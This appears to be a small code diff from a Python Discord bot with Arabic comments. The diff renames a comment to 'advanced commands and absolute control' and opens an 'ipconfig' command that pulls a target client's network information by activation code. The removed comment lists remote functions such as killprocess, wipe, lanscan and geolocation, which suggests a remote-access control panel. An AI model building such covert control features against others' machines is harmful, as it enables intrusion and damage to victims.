@@ -629,7 +629,7 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
     await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
 
-# الأوامر المتقدمة المضافة (ipconfig, lanscan, files, killprocess, wipe, geolocation, lagtimer)
+# ─── الأوامر المتقدمة والتحكم المطلق ───
 @client.tree.command(name="ipconfig", description="سحب معلومات الشبكة IP للعميل")
 @app_commands.describe(target="كود التفعيل المستهدف")
 async def cmd_ipconfig(interaction: discord.Interaction, target: str):
